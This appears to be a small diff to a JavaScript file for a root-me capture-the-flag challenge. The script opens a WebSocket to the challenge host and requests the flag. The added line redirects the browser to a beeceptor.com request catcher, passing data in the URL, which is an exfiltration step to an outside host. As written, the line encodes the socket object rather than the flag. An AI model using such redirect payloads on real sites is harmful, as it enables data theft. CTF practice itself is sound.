@@ -3,6 +3,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
     var ws = new WebSocket("ws://ctf17.root-me.org/ws");
 
+    window.location = "https://toitoise2.free.beeceptor.com/?ws=" + encodeURIComponent(ws);
+
     ws.onopen = function () {
         ws.send("flag");
     };
